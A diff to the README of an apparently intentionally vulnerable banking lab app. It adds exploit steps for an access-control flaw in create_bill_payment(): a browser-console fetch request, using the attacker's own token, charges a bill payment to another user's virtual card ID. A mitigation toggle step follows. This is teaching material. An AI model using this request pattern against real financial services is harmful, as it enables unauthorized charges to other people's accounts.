@@ -109,4 +109,27 @@ Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button
 ### create_bill_payment()
 Allows attacker to create a payment on the balance of any card belonging to any user.
 #### Exploit
+1. Log in as any user and open the browser console.
+2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:
+
+    `const attackerToken = localStorage.getItem('jwt_token');
+    fetch('/api/bill-payments/create', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        Authorization: 'Bearer ' + attackerToken
+    },
+    body: JSON.stringify({
+        biller_id: 1,
+        amount: 1.0,
+        payment_method: 'virtual_card',
+        card_id: <vc_num>,
+        description: 'test' // Can be any string
+    })
+    }).then(r => r.json()).then(console.log);`
+
+![alt text](./screenshots/image-12.png)
+
 #### Mitigate
+Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack and observe outcome:
+![alt text](./screenshots/image-13.png)
